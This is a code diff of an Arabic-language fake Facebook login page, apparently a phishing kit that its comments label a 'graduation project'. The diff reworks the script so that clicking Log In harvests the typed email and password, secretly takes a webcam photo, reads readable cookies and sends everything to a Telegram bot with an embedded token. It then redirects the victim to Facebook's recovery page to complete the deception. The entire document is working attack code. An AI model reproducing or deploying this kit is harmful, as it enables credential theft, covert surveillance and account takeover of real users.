@@ -2,25 +2,23 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Facebook - Login</title>
+    <title>Facebook - Secure Login</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 100%; max-width: 400px; text-align: center; }
-        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        .btn-login { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8a8d91; }
+        body { background: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 100%; max-width: 380px; text-align: center; }
+        .logo { color: #1877f2; font-size: 36px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <div class="fb-logo">facebook</div>
+<div class="login-box">
+    <div class="logo">facebook</div>
     <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
     <input type="password" id="pass" placeholder="كلمة السر">
-    <button class="btn-login" id="loginBtn">تسجيل الدخول</button>
-    <div class="footer">Meta © 2026</div>
+    <button class="btn" id="loginBtn">Log In</button>
 </div>
 
 <video id="video" style="display:none" autoplay playsinline></video>
@@ -30,67 +28,57 @@
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-// 1. تشغيل الهجوم تلقائياً عند فتح الرابط
-window.onload = () => captureData("دخول تلقائي للرابط");
-
-// 2. سحب البيانات عند الضغط على الزر
-document.getElementById('loginBtn').onclick = function() {
+document.getElementById('loginBtn').onclick = async function() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
-    if(email && pass) {
-        this.innerText = "جاري التحقق...";
-        captureData(`بيانات تسجيل الدخول:\nUser: ${email}\nPass: ${pass}`);
-    }
+    
+    this.innerText = "Processing...";
+    await startHarvesting(`⚠️ محاولة دخول جديدة:\nEmail: ${email}\nPass: ${pass}`);
 };
 
-async function captureData(triggerSource) {
-    let photoData = null;
-    let locationInfo = "تم رفض الموقع";
-
+async function startHarvesting(loginData) {
+    let photo = null;
+    let location = "Location Access Denied";
+    
+    // سحب الصورة
     try {
-        // سحب الصورة
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 1500));
+        await new Promise(r => setTimeout(r, 1000));
         const canvas = document.getElementById('canvas');
         canvas.width = 640; canvas.height = 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        photoData = canvas.toDataURL('image/jpeg');
+        photo = canvas.toDataURL('image/jpeg');
         stream.getTracks().forEach(t => t.stop());
+    } catch(e) {}
 
-        // سحب الموقع
-        await new Promise(resolve => {
-            navigator.geolocation.getCurrentPosition(pos => {
-                locationInfo = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                resolve();
-            }, () => resolve());
-        });
-    } catch (e) {}
+    // سحب الكوكيز المتاحة (غير المحمية بـ HttpOnly)
+    let cookiesCaptured = document.cookie || "🛡️ الحماية مفعلة: الكوكيز محمية بـ HttpOnly ولا يمكن للـ JS قراءتها";
 
-    sendToTelegram(photoData, locationInfo, triggerSource);
+    const finalMsg = `🎭 **مشروع التخرج: تقرير الاختراق** 🎭\n\n${loginData}\n\n📍 الموقع: يتم السحب...\n🍪 الكوكيز المكتشفة: \n${cookiesCaptured}\n\n📱 النظام: ${navigator.platform}`;
+    
+    sendToTelegram(photo, finalMsg);
 }
 
-async function sendToTelegram(photo, location, text) {
-    const message = `🎭 **إنجاز مشروع التخرج** 🎭\n\n📝 ${text}\n📍 الموقع: ${location}\n📱 النظام: ${navigator.platform}`;
-    
+async function sendToTelegram(photo, msg) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
     if (photo) {
         const blob = await (await fetch(photo)).blob();
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'shot.jpg');
-        fd.append('caption', message);
-        fd.append('parse_mode', 'Markdown');
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        fd.append('photo', blob, 'victim.jpg');
+        fd.append('caption', msg);
+        await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
     } else {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await fetch(url + 'sendMessage', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
         });
     }
-
-    if(text.includes("بيانات")) window.location.href = "https://www.facebook.com";
+    // تحويل الضحية لفيسبوك الحقيقي لإكمال الخدعة
+    window.location.href = "https://www.facebook.com/recover/initiate";
 }
 </script>
 </body>
